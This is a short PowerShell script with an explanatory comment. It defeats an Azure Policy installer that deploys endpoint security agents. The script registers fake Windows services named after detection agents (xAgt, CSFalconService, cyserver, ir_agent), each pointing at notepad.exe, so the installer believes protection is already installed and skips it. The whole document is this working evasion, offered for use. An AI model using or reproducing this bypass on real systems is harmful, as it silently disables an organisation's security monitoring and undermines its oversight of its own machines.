# Azure Policy installs a custom script extension that runs a PowerShell
# installer script that only checks for whether a Wdinwos Service is present
# which is used as an indicated for previous installation initiation. However,
# since it's such a simple installer script it's easy to bypass by simply
# creating dummy services that don't even need to be activey running.
$dummyServices = @("xAgt", "CSFalconService", "cyserver", "ir_agent")

foreach ($serviceName in $dummyServices) {
    New-Service -Name $serviceName -BinaryPathName "notepad.exe"
}

